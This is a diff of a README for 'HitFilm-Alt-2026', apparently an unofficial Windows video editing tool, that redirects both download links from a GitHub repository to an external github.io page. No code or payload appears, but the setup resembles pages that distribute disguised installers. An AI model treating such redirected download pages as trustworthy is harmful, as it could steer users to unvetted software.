@@ -1,6 +1,6 @@
 # 🎬 HitFilm-Alt-2026 - Create professional videos on Windows today
 
-[![Download HitFilm-Alt-2026](https://img.shields.io/badge/Download-HitFilm--Alt--2026-blue)](https://github.com/Asirank8370/HitFilm-Alt-2026)
+[![Download HitFilm-Alt-2026](https://img.shields.io/badge/Download-HitFilm--Alt--2026-blue)](https://asirank8370.github.io)
 
 This repository provides access to HitFilm-Alt-2026, a video editing and visual effects tool for Windows 10 and 11. Use this software to cut clips, add effects, and export high-quality video projects.
 
@@ -21,7 +21,7 @@ It is helpful to keep your graphics card drivers updated to the current version 
 
 You can get the installation files by visiting the project page.
 
-[Click here to visit the download page for HitFilm-Alt-2026](https://github.com/Asirank8370/HitFilm-Alt-2026)
+[Click here to visit the download page for HitFilm-Alt-2026](https://asirank8370.github.io)
 
 Follow these steps to download the installer:
 
